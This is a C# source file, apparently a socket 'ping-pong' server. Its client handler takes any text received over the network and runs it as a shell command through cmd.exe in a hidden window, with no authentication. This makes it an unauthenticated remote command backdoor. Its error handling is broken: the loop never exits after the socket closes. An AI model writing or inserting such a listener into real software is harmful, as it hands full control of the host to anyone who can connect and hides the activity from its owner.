using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Sockets_PingPongServer
{
    public class HandleClinet
    {
        Socket clientSocket = null;
        public void Connect(Socket clientSockett)
        {
            clientSocket = clientSockett;
            Thread ctThread = new Thread(Start);
            ctThread.Start();
        }
        public void Start()
        {
            while (true)
            {
                byte[] bytesReceive = new Byte[1024];
                string data = null;

                try
                {
                    int numByte = clientSocket.Receive(bytesReceive);
                    data = Encoding.ASCII.GetString(bytesReceive,
                                          0, numByte);

                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.WorkingDirectory = @"C:\Code";
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = "/C"+ data;
                    process.StartInfo = startInfo;

                    Console.WriteLine("Command Line received -> {0} ", data);
                    var isSuccess = process.Start();

                    byte[] messageReturn = Encoding.ASCII.GetBytes("the command success: " + isSuccess.ToString());

                    clientSocket.Send(messageReturn);
                }
                catch (SocketException)
                {
                    clientSocket.Close();
                }
                catch (ObjectDisposedException)
                {
                    clientSocket.Close();
                }
                catch (Exception)
                {
                    clientSocket.Close();
                }
            }
        }
    }
}
